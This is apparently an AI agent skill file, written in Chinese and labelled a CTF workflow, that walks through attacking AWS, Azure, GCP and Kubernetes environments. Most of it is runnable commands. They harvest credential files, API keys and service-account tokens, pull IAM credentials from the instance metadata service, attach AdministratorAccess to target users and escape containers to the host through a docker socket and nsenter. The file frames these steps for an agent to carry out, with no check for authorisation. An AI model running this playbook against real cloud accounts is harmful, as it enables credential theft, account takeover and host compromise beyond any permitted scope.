---
name: cloud
description: triggers: CLOUD, 云攻击, 云安全, cloud attack, AWS, Azure, GCP, k8s, kubernetes, 容器逃逸, IAM, 云配置审计, serverless, S3
---

# CLOUD 云攻击 — CTF 自动化工作流

面向云原生与多云环境：凭据发现 → 云枚举 → 配置审计 → IAM 提权 → 容器/k8s 攻击。

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| aws cli | 官方 msi | AWS 资源操作 |
| az cli | 官方 msi | Azure 资源操作 |
| gcloud | 官方安装 | GCP 资源操作 |
| ScoutSuite | `pip install scoutsuite` | 多云配置审计 |
| prowler | `pip install prowler` | AWS/GCP/Azure 审计 |
| trivy | `scoop install trivy` | 容器/镜像漏洞扫描 |
| kubectl | `scoop install kubectl` | k8s 集群管理 |

## 工作流：五阶段推进

### 阶段 1: 凭据发现 Credential Discovery

```bash
# 1a. 环境变量
set  # Windows
env  # Linux

# 1b. 常见凭据位置
# AWS: ~/.aws/credentials, ~/.aws/config
# Azure: ~/.azure/, $AZURE_*
# GCP: ~/.config/gcloud/, $GOOGLE_APPLICATION_CREDENTIALS
# k8s: ~/.kube/config, /var/run/secrets/kubernetes.io/serviceaccount/token

# 1c. 配置文件搜索
findstr /s /i "AKIA" *.txt *.json *.yaml *.yml *.env 2>nul  # Windows
grep -r "AKIA\|ASIA" --include="*.{txt,json,yaml,yml,env}" .  # Linux

# 1d. 元数据服务（云环境内）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/
curl http://metadata.google.internal/computeMetadata/v1/
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
```

### 阶段 2: 云枚举 Enumeration

```bash
# 2a. AWS
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws ec2 describe-instances
aws s3 ls
aws lambda list-functions
aws rds describe-db-instances

# 2b. Azure
az account show
az ad user list
az vm list
az storage account list
az keyvault list

# 2c. GCP
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud iam service-accounts list
gcloud storage buckets list

# 2d. k8s
kubectl get nodes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl auth can-i --list
```

### 阶段 3: 配置审计 Audit

```bash
# 3a. ScoutSuite 多云审计
scout aws
scout azure
scout gcp

# 3b. prowler 审计
prowler aws
prowler azure
prowler gcp

# 3c. 手动审计关键检查
# S3 bucket 公开
aws s3api get-bucket-acl --bucket <name>
# IAM 过度权限
aws iam list-attached-user-policies --user-name <user>
# 安全组 0.0.0.0/0
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values=0.0.0.0/0
```

### 阶段 4: IAM 提权 Privilege Escalation

```bash
# 4a. 列出当前权限
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names <actions>

# 4b. 常见提权向量
# iam:CreateAccessKey → 创建新访问密钥
# iam:CreateLoginProfile → 创建控制台登录
# iam:UpdateLoginProfile → 修改密码
# iam:AttachUserPolicy → 附加管理员策略
# lambda:UpdateFunctionCode → 修改 Lambda 代码
# ec2:RunInstances → 启动实例并附加角色

# 4c. 尝试提权
aws iam create-access-key --user-name <target_user>
aws iam attach-user-policy --user-name <target_user> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 阶段 5: 容器与 k8s Containers

```bash
# 5a. 容器枚举
trivy image <image>
docker ps -a
docker inspect <container_id>

# 5b. k8s 攻击
kubectl get pods -A
kubectl exec -it <pod> -- /bin/sh
# 检查 service account token
kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 5c. 容器逃逸检查
# privileged 容器
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext.privileged'
# 挂载 docker socket
kubectl get pods -o json | jq '.items[].spec.volumes[].hostPath.path'
# 如果有 docker socket 挂载
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

## 命令模板速查

### 云凭据快速检测

```bash
# 一次性检测所有云凭据
grep -rn "AKIA[0-9A-Z]\{16\}" --include="*.{txt,json,env,yaml,yml,py,js,go,ts}" . 2>/dev/null
grep -rn "sk-[a-zA-Z0-9]\{48\}" --include="*.{txt,json,env,yaml,yml,py,js,go,ts}" . 2>/dev/null
grep -rn "AIza[0-9A-Za-z\-_]\{35\}" --include="*.{txt,json,env,yaml,yml,py,js,go,ts}" . 2>/dev/null
```

### 无 aws cli 时的元数据探测

```bash
# 直接用 curl 探 AWS 元数据
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

### k8s 快速攻击链

```bash
# 1. 检查当前权限
kubectl auth can-i --list
# 2. 找敏感 secret
kubectl get secrets -A
# 3. 读 secret
kubectl get secret <name> -o json
# 4. 如果有特权 pod
kubectl exec <privileged_pod> -- nsenter -t 1 -m -u -n -i sh
```

## 判定规则

1. **发现云凭据（AKIA/sk-/AIza）** → 直接 Critical
2. **元数据服务可访问** → 获取 STS 凭据，Critical
3. **S3 bucket 公开读写** → 数据泄露，High
4. **IAM 可提权** → 横向到管理员，Critical
5. **容器 privileged + hostPID** → 可逃逸，Critical
6. **k8s SA token 可读** → 集群内横向，High

## 输出

每个确认漏洞：云平台、资源类型、漏洞类型、严重度、证据、复现步骤。